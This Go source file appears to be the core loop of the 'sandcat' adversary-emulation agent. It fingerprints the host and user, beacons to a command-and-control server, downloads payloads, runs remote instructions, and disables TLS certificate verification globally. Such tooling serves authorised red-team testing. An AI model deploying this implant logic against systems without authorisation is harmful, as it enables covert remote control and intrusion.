package core

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"time"
	"path/filepath"

	"../contact"
	"../execute"
	"../util"
	"../output"
	"../privdetect"
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	checkin := time.Now()
	for {
		beacon := coms.GetInstructions(profile)
		if len(beacon) != 0 {
			checkin = time.Now()
		}
		if beacon["watchdog"] != nil {
			profile["watchdog"] = beacon["watchdog"]
		}
		if beacon["sleep"] != nil {
			profile["sleep"] = beacon["sleep"]
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s\n", command["id"]))
				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
				go coms.RunInstruction(command, profile, payloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			util.Sleep(float64(profile["sleep"].(int)))
		}
		util.EvaluateWatchdog(checkin, profile)
	}
}

func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string, watchdog int) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	rand.Seed(time.Now().UnixNano())
	pawID := rand.Intn(999999 - 1)

	profile := make(map[string]interface{})
	profile["paw"] = fmt.Sprintf("%d", pawID)
	profile["server"] = server
	profile["group"] = group
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["sleep"] = sleep
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	profile["privilege"] = privilege
	profile["exe_name"] = filepath.Base(os.Args[0])
	profile["c2"] = strings.ToUpper(c2)
	profile["watchdog"] = watchdog

	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
	if !validC2Configuration(coms, profile["c2"].(string), c2Config) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
		profile["c2"] = "HTTP"
		coms, _ = contact.CommunicationChannels[profile["c2"].(string)]
	}

	if coms.Ping(profile["server"].(string)) {
		//go util.StartProxy(profile["server"].(string))
		return coms
	}
	proxy := util.FindProxy()
	if len(proxy) == 0 {
		return nil
	}
	profile["server"] = proxy
	return coms
}

func validC2Configuration(coms contact.Contact, c2Selection string, c2Config map[string]string) bool {
	if strings.EqualFold(c2Config["c2Name"], c2Selection) {
		if _, valid := contact.CommunicationChannels[c2Selection]; valid {
			return coms.C2RequirementsMet(c2Config["c2Key"])
		}
	}
	return false
}

func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, verbose bool, watchdog string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	sleepInt, _ := strconv.Atoi(sleep)
	watchdogInt, _ := strconv.Atoi(watchdog)
	privilege := privdetect.Privlevel()

	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("server=%s", server))
	output.VerbosePrint(fmt.Sprintf("group=%s", group))
	output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
	output.VerbosePrint(fmt.Sprintf("watchdog=%d", watchdogInt))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))

	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"], watchdogInt)
	util.Sleep(float64(delay))

	for {
		coms := chooseCommunicationChannel(profile, c2)
		if coms != nil {
			for { runAgent(coms, profile) }
		}
		util.Sleep(300)
	}
}
